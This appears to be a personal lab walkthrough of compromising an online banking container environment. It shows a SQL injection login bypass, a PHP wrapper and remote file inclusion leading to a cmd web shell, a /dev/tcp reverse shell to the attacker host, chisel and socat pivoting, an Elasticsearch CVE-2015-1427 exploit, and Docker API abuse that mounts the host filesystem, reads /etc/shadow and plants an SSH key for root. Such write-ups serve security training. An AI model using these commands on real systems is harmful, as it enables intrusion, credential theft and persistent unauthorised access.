![[Pasted image 20240327200326.png]]

Based in SSH version, we can try to fin an exploit to enumerate the users. (OPENSSH Enumeration with searchsploit)
## SQL Injection
[[In-band SQL Injection (Classic SQLi)]]]
 Payload:
 login: *' or 1=1-- -*

![[Pasted image 20240327201503.png]]

## Local File Inclusion
[[File Inclusion]]

Trying different payloads:
http://172.16.1.140/OnlineBanking/index.php?p=../../../../etc/hosts
../../../../
/etc/hosts
/etc/hosts%00 
*considering end of string by using* ==byte null %00== in case there is something else running after the string*
They don't work, however, there is no error, the site is only showing a blank page so it's probably trying to read the path.

As application is running on PHP, there is probably a mecanism of sanitizing the code.

After trying many payloads, we figure out that it only works will specific words part of a whilist: welcome, balance, etc (pages of the site)

![[Pasted image 20240328155958.png]]
[[PHP Wrappers]]
so, we can get the source code in php by using a wrappers filter
Payload:
http://172.16.1.140/OnlineBanking/index.php?p=php://filter/convert.base64-encode/resource=welcome
>PD9waHAKc2Vzc2lvbl9zdGFydCgpOwoKaWYoaXNfbnVsbCgkX1NFU1NJT05bImxvZ2dlZGluIl0pKXsKCWhlYWRlcigiTG9jYXRpb246IC8iKTsKfQoKPz4KCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgIDx0aXRsZT5IYXJib3IgQmFuayBPbmxpbmU8L3RpdGxlPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC8zLjMuNy9jc3MvYm9vdHN0cmFwLmNzcyI

by using base64 -d we found the code.
 Doing the same for balance, we get the souce code in php
![[Pasted image 20240328160442.png]]

We found mysql credentials but there is not databases in this server.
[[File Inclusion]]
 we can try changing the resource to be gotten from our server: by using a remote file inclusion:
 
![[Pasted image 20240328163908.png]]
![[Pasted image 20240328163858.png]]

We can create a *balance* php with an system call:

<?php
	system("whoami")
?>

payload:
http://172.16.1.140/OnlineBanking/index.php?p=http://172.16.1.128/balance

![[Pasted image 20240328164330.png]]

Now we are executing a command to the victime machine.

Using *ip a* we figure out that we are in a container
![[Pasted image 20240328164422.png]]

With *ls -la /* we found the file *.dockerenv*

In order to run the command directly in the site, we modify **balance**
<?php
	system($_GET['cmd']);
?>

payload:
http://172.16.1.140/OnlineBanking/index.php?p=http://172.16.1.128/balance&cmd=whoami

Trying to fivure out if the have bash
ttp://172.16.1.140/OnlineBanking/index.php?p=http://172.16.1.128/balance&cmd=which bash 2>%261
- *&* in url encode is *%26*
- we redirection error (2) as input (1)

However we found that there is *sh*
We try to create a reverse shell by using sh:
 `sh -c "sh -i >& /dev/tcp/172.16.1.128/4443 0>&1"`
& in url encode but it doesn't work

We try using  a predifined php reverse shell:

monkey pentest which uses /bin/sh. 

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Downloading and change the name to *balance.php* and using a listener: `nc -lvnp 4443`

We chage the IP address and the port in the file as well before and we get a reverse shell.

In order to not block the site, we can use *nohup* to run our shell in background:

1. We upload balance.php reverse shell directly to the server to avoid using through the web server.
![[Pasted image 20240328184325.png]]

Using: `nohup php balance.php &` we create a new session independent to the web

![[Pasted image 20240328184724.png]]

we can try using `rlwrap nc -lnvp 4443` to get a better console

As we are container, we try enumerating other containers

![[Pasted image 20240328185339.png]]

## Pivoting
[[Pivoting]]

Now we try to reach the other containers by using *chisel*
We download and share the binary to the container by using *wget*

Attaker:
`./chisel server --reverse -p 1234`

Victim:
`./chisel client 172.16.1.128:1234 R:socks`

Once the tunnel is created, we need to update */etc/proxychains.conf* in order to add the new route

![[Pasted image 20240328193417.png]]

We can scan open ports of machines found as containers:
![[Pasted image 20240328193703.png]]

#### Testing port 3306 in mysql container:
`proxychains nmap -sT -Pn -p3306 --open -T5 -v -n 172.20.0.138` *it's important to use -sT when using proxychains*

![[Pasted image 20240328193823.png]]

To test if port 80 is open in all the segment:

`seq 1 254 | xargs -P50 -I {} proxychains nmap -sT -Pn -80 --open -T5 -v -n 172.20.0.{} 2>&1 | grep "open"` *finding open ports using 50 threads*
![[Pasted image 20240328194254.png]]

After using this discovery, we can update in victime web container he arp table result finding new hosts:

![[Pasted image 20240328194350.png]]

## MYSQL exploitation
mysql -u root -h 172.20..0.138 -p
pass: *TestPass123!*

![[Pasted image 20240329033853.png]]
### Enumerating the DataBase
We found login information but it's not valuable to avance to the other machines
![[Pasted image 20240329034307.png]]
## Exploiting ElasticSearch server

Now we try to exploit the ElasticSearch container. We can speed up a port scan by using *xargs*

`seq 1 65365 | xargs -P200 -I {} proxychains nmap -sT -Pn -n -T5 -v --open -p{} 172.20.0.124 2>&1 | grep "open"`

![[Pasted image 20240329040957.png]]

We can google it and we can found that ElasticSearch works on port 9200 for request and 9300 for the communication between nodes.
![[Pasted image 20240329041102.png]]

Configuring the socks5 proxy:
![[Pasted image 20240329041245.png]]
![[Pasted image 20240329041345.png]]
As version is 1.4.2, we look for exploits:
![[Pasted image 20240329042617.png]]
Trying the first one, we found it's related to CVE-2015-1427 
#### Gaining console
 `proxychains python2.7 elasticsearch.py 172.20.0.124`
 
![[Pasted image 20240329044734.png]]
This terminal doesn't permit execute commands different to list files.
By looking for the bash history of root:
`ls -la /root`
![[Pasted image 20240329073103.png]]
`cat /root/.bash_history`
![[Pasted image 20240329073152.png]]
Root user was getting HTTP information to that IP by port **2375** which is related to API dockers.

[[Docker Unauthenticated Access]]

When trying to ennumerate this, we found between brackets {"message":"not found"}
![[Pasted image 20240329140104.png]]

We can ennumerate the version adding a directory */version*
![[Pasted image 20240329150150.png]]

#### Installing a tunnel in ElasticSearch server

At first we don't have connection to main victim since our attacker machine
![[Pasted image 20240329152858.png]]

However ElasticSearch machine has connectivity to us
![[Pasted image 20240329153029.png]]

Loading chisel:

![[Pasted image 20240329153151.png]]
![[Pasted image 20240329153247.png]]

As we don't have access to main victim segment 127.20.0.0/24, we create a tunnel from ElasticSearch to Web container that in the same time it has connection to as by a chisel tunnel. Before starting the tunnel, we need *socat* to redirect the trafic 

https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

Stablishing socat redirection between 172.20.0.8 (port 6566) and 172.16.1.128 (attaker port 1234). So all incomming traffic of a client will be redirected to our chisel server in the attacker machine.

`./socat TCP-LISTEN:6566,fork TCP:172.16.1.128:1234`

#### Tunnel from elasticsearch container to web container

In elastic search container:
`./chisel client 172.20.0.8:6566 R:8888:socks`

Through a tunnel, all trafic coming from port 8888 of elastic search machine will go to web container in his port 6566

#### Verifying second tunnel created:

![[Pasted image 20240329173225.png]]
we don't have yet connection since we need to edit */etc/proxychains.conf* file:
Enablind dynamic mode and ng static:
![[Pasted image 20240329174031.png]]

![[Pasted image 20240329174003.png]]

Now we have access to remote ressource
`proxychains curl http://172.20.0.1:2375/version`
![[Pasted image 20240329174217.png]]
We can enumerates images as well:
`proxychains curl http://172.20.0.1:2375/images/json 2>/dev/null | grep -vi proxychains | jq` *We can see the repos tags and the images*

We can only filter by Repotags
`proxychains curl http://172.20.0.1:2375/images/json 2>/dev/null | grep -vi proxychains | jq | grep RepoTags -A 1` *grep -A 1 shows the chain wanted plus an line more after it*
We find a list of images we can create.
![[Pasted image 20240329181151.png]]

## Abusing Docker API in order to create a new container
[[Abusing Docker API]]
[[Docker Breakout]]
Creating a container to mount a root file:

https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting

![[Pasted image 20240329181613.png]]

### Creating a container that has mounted the host file system and read /etc/shadow
`curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'`

`curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test`

`curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'`

`curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'`

Editing the first command:

`proxychains curl -X POST -H "Content-Type: application/json" "http://172.20.0.1:2375/containers/create?name=test" -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'` *-insecure is removed because the site is http*

It throws an error since lates version of alpin is not in the repository, we need to specify as we found:

![[Pasted image 20240329183854.png]]
#### Creating the container:
`proxychains curl -X POST -H "Content-Type: application/json" "http://172.20.0.1:2375/containers/create?name=test" -d '{"Image":"alpine:3.2", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'`
>ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:8888-<><>-172.20.0.1:2375-<><>-OK
{"Id":"0e47c9f38f0f99e8d70974963e2af83158441e50cffd9f8b3b1b5c3d75a83184","Warnings":null}

#### Launching the container

`proxychains curl -X POST -H "Content-Type: application/json" "http://172.20.0.1:2375/containers/0e47c9f38f0f99e8d70974963e2af83158441e50cffd9f8b3b1b5c3d75a83184/start?name=test"`

![[Pasted image 20240329184908.png]]

#### Injecting the code:
`proxychains curl -X POST -H "Content-Type: application/json" http://172.20.0.1:2375/containers/0e47c9f38f0f99e8d70974963e2af83158441e50cffd9f8b3b1b5c3d75a83184/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "ls -l /mnt/root"]}'`

![[Pasted image 20240329191323.png]]
>{"Id":"0d92748806076323bb07b5ebd8d5687e18738ab39c4da6d7c1fc813419668928"}
With the generated indentifier, we will use other command to show the output result:

#### Showing result

`proxychains curl -X POST -H "Content-Type: application/json" "http://172.20.0.1:2375/exec/0d92748806076323bb07b5ebd8d5687e18738ab39c4da6d7c1fc813419668928/start" -d '{}' --output -` *it's important to consider the output*

![[Pasted image 20240329192200.png]]

#### Injecting public key
So we can see root files, we can try to inject our rsa public key to the root machine to make possible a ssh connection without the password:

In our side, we create a pair keys:
`ssh-keygen`
`cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip`  

Payload:
`proxychains curl -X POST -H "Content-Type: application/json" "http://172.20.0.1:2375/containers/0e47c9f38f0f99e8d70974963e2af83158441e50cffd9f8b3b1b5c3d75a83184/exec" -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCPVV5xRt4AzWv+J2+X8rD82kARl5NdWwV/DvNBZbhkDbgprpVn/nB/QYttTNr/asb1LAGUYmODe56E8dthkot9KqjaKutvxq/43OXt1dPaVSTe9wJpnPr2PyxRsSlroBxSLqBs6xQ1c3/9udyPLqp4mCqncA4pPhuwCI4qFEE6tRJZWGUn2q3olUF80G5hyIqrHBVab64c5tjh/M/83deUVNu//oJv+NhhdoWZi4t4erQrpAl/7wDRHxmOR01VjKYs7zy12AcxD+rWksmkpH662DTkFwyMS8ZleXKGfqkWldtfsAkyqWbSQrsu5j7cKAtD4aI8weB79eU8/hcUXJFhZivkOawexdQYeFepzqcozSlwxSynh7fgC1pdkev9KXCjBxTDeyJik0nLvIdjnhyhzRTVmhg9yvXbpAP4EF5snGda8xmKX+SNcfmmxBtSnGFIbsM9+Q++vVo8pDcQa9tsB2dTa6BjI7q1ndXfa3csS2ow+nzxvJd+lq8jCvktiUc= root@parrot > /mnt/root/.ssh/authorized_keys"]}'`
>{"Id":"9b9e4d0e8f6a3a81da52473aa399167da0e0d09c3e02298d94bce3796feef138"}

`proxychains curl -X POST -H "Content-Type: application/json" "http://172.20.0.1:2375/exec/9b9e4d0e8f6a3a81da52473aa399167da0e0d09c3e02298d94bce3796feef138/start" -d '{}' --output -`

We've got OK, so we can test to connect us to the real machine using the IP to which we have direct connection or to the docker interface IP:

`ssh root@172.16.1.140`
`proxychains ssh root@172.20.0.1`




